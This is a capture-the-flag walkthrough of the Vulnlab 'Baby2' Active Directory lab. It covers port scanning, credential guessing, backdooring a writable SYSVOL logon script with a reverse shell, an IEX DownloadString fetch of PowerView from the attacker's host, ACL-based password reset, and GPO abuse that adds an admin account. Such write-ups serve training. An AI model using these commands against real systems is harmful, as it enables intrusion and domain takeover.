---
title: Vulnlab — Baby2    
date: 2025-07-18 00:00:00 +0800      
categories: [vulnlab machines]          
tags: [vulnlab]         
toc: true                           
comments: false                    
math: false                          
mermaid: false   
image:                              
  path: https://assets.vulnlab.com/baby2_slide.png                  
---

- **OS**: Windows Active Directory
- **Difficulty**: Intermediate

## Service Enumeration

**Port Scan Results**

**TCP**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 9389, 49664, 49667, 49671, 49680, 49681, 57296, 61241, 61247, 61259

**UDP**: 53, 88, 123, 389

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```
┌──(kali㉿kali)-[~/vulnlab/Baby2]
└─$ sudo ~/nmapAutomator/nmapAutomator.sh 10.10.101.177 All

Running all scans on 10.10.101.177

No ping detected.. Will not use ping scans!


Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
88/tcp   open  kerberos-sec
389/tcp  open  ldap
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-17 17:00:07Z)
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-07-17T16:50:08
|_Not valid after:  2026-07-17T16:50:08
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-07-17T16:50:08
|_Not valid after:  2026-07-17T16:50:08
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-07-17T16:50:08
|_Not valid after:  2026-07-17T16:50:08
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-07-17T16:50:08
|_Not valid after:  2026-07-17T16:50:08
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows



---------------------Starting Full Scan------------------------


PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
57296/tcp open  unknown
61241/tcp open  unknown
61247/tcp open  unknown
61259/tcp open  unknown


Making a script scan on extra ports: 53, 135, 139, 445, 3389, 9389, 49664, 49667, 49671, 49680, 49681, 57296, 61241, 61247, 61259


PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-07-16T16:59:12
|_Not valid after:  2026-01-15T16:59:12
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-17T17:16:43+00:00
|_ssl-date: 2025-07-17T17:17:22+00:00; -2s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
57296/tcp open  msrpc         Microsoft Windows RPC
61241/tcp open  msrpc         Microsoft Windows RPC
61247/tcp open  msrpc         Microsoft Windows RPC
61259/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-17T17:16:45
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -2s



----------------------Starting UDP Scan------------------------


PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap


Making a script scan on UDP ports: 53, 88, 123, 389


PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD: 
|     _services
|     _dns-sd
|     _udp
|     local
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-17 17:17:56Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Initial Access —modifiable logon script

login as guest user and mirror all shares.

![image-20260211041105464](assets/img/image-20260211041105464.png)

![image-20260211041108020](assets/img/image-20260211041108020.png)

We saw some usernames

![image-20260211041111123](assets/img/image-20260211041111123.png)

![image-20260211041113265](assets/img/image-20260211041113265.png)

Try to bruteforce and got two credentials `library:library` and `Carl.Moore:Carl.Moore` .

![image-20260211041115788](assets/img/image-20260211041115788.png)

There is a vbs script in SYSVOL shares that is modifiable.

```
└─$ smbclient //10.10.98.6/sysvol -U 'library'
Password for [WORKGROUP\library]:
Try "help" to get a list of possible commands.
smb: \> cd baby2.vl
smb: \baby2.vl\> cd scripts
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Tue Aug 22 15:28:27 2023
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  login.vbs                           A     2424  Fri Jul 18 03:12:07 2025

                6126847 blocks of size 4096. 2010988 blocks available
smb: \baby2.vl\scripts\> get login.vbs
getting file \baby2.vl\scripts\login.vbs of size 2424 as login.vbs (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```

Generate reverse shell command

> [Online - Reverse Shell Generator](https://www.revshells.com/)

![image-20260211041118363](assets/img/image-20260211041118363.png)

Append command to vbs script to execute reverse shell.

```
vim login.vbs
```

![image-20260211041121039](assets/img/image-20260211041121039.png)

upload the script.

```bash
smb: \baby2.vl\scripts\> put login.vbs
putting file login.vbs as \baby2.vl\scripts\login.vbs (3.0 kb/s) (average 1.8 kb/s)
```

```
$ nc -lvnp 80                                             
listening on [any] 80 ...
connect to [10.8.6.242] from (UNKNOWN) [10.10.126.43] 50343

PS C:\Windows\system32>
```

```bash
PS C:\> whoami
BABY2.vl\AMELIA.GRIFFITHS

PS C:\> type user.txt
<REDACTED>
```

## Privilege Escalation — GPO abuse

Use bloodhound to collect data.

```
nxc ldap 10.10.101.177 -u 'library' -p 'library' --bloodhound --collection All --dns-server 10.10.101.177
LDAP        10.10.101.177   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.10.101.177   389    DC               [+] baby2.vl\library:library 
LDAP        10.10.101.177   389    DC               Resolved collection methods: trusts, objectprops, acl, dcom, localadmin, psremote, rdp, container, session, group
LDAP        10.10.101.177   389    DC               Done in 00M 49S
LDAP        10.10.101.177   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.101.177_2025-07-17_133339_bloodhound.zip
```

```
bloodhound
```

AMELIA.GRIFFITHS can **WriteDacl** to user GPOADM, and user GPOADM have **GenericAll** to DEFAULT DOMAIN POLICY and DEFAULT DOMAIN CONTROLLER POLICY.

![bloodhound 1](https://cdn-images-1.medium.com/max/800/1*SFSy-9fe-mIMNf8Or9-MSA.png)

![image-20260211041124526](assets/img/image-20260211041124526.png)

![bloodhound 3](https://cdn-images-1.medium.com/max/800/1*LcENKy_8qq6Hio5-XPrHRg.png)

```
PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('http://10.8.6.242:445/PowerView.ps1')
```

```
└─$ updog -p 445
[+] Serving /home/kali/vulnlab/Baby2...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:445
 * Running on http://10.148.249.11:445
Press CTRL+C to quit
10.10.98.6 - - [18/Jul/2025 02:47:12] "GET /PowerView.ps1 HTTP/1.1" 200 -
```

Change GPOADM's password.

```
Add-DomainObjectAcl -TargetIdentity gpoadm -Rights All -PrincipalIdentity AMELIA.GRIFFITHS
net user gpoadm Password123! /domain
```

This command will create user **john** and password **H4x00r123..** to administrators group

> [GitHub - Hackndo/pyGPOAbuse: Partial python implementation of SharpGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)

![image-20260211041127897](assets/img/image-20260211041127897.png)

```
python3 pygpoabuse.py baby2.vl/gpoadm:'Password123!' -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9" -dc-ip 10.10.98.6
SUCCESS:root:ScheduledTask TASK_90b27a7b created!
[+] ScheduledTask TASK_90b27a7b created!
```

```
PS C:\users\Amelia.Griffiths> gpupdate /force                     
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

```
└─$ evil-winrm -i 10.10.98.6 -u 'john' -p 'H4x00r123..'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> 
```

```bash
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
<REDACTED>
```
